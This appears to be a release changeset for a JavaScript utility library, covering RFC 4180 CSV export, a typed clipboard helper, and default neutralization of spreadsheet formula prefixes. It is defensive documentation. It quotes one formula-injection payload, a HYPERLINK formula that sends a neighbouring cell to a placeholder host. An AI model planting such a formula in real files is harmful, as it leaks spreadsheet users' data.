---
'egl-utils-js': minor
---

**CSV export and the clipboard** (ROADMAP 19.4, spec 06 F96–F97,
[ADR-0066](docs/adr/0066-a-csv-is-not-an-inert-document.md)).

- **`tableCsv(rows, {columns, …})`** on `egl-utils-js/table` — RFC 4180, zero-dependency, pure
  and SSR-safe: quoting only where the grammar requires it, doubled quotes inside quoted
  fields, CRLF by default and LF as an option, a configurable delimiter. It exports the rows
  you pass, so the current page, the whole source or the selection are all just a different
  argument.
- **`copyToClipboard(text, {window})`** on `egl-utils-js/dom` — a clipboard write whose every
  refusal is typed.
- **`ClipboardError`** (`EGL_CLIPBOARD`) on `egl-utils-js/errors` and the root, carrying
  `reason: 'unsupported' | 'insecure' | 'denied' | 'failed'`.

**A CSV is not an inert document, and the default reflects that.** Every mainstream spreadsheet
evaluates a cell whose text begins `=`, `+`, `-` or `@`, so a field reading
`=HYPERLINK("http://x/?"&A1,"click")` exfiltrates the row beside it the moment the file is
opened. Those prefixes are **neutralized by default** — with one exception that keeps the
mitigation liveable: **a field whose whole text is a number is left alone**, because prefixing
every negative number would corrupt whole columns to buy nothing. `neutralizeFormulas: false`
turns it off for callers who know their consumer is a parser and not a spreadsheet.

**A copy that did nothing must not look like one that worked.** The clipboard is
permission-gated and secure-context-only, so `copyToClipboard` distinguishes an HTTP page
(`'insecure'`, fixable) from a refused permission (`'denied'`, the user's to grant) from an
engine without the API (`'unsupported'`). There is deliberately **no `execCommand`
fallback** — it is deprecated, silently unreliable, and would restore the ambiguity this
removes.

Excel stays out of core (NFR-06): `tableCsv` is the extension point, and the same rows go to
any workbook writer you choose.
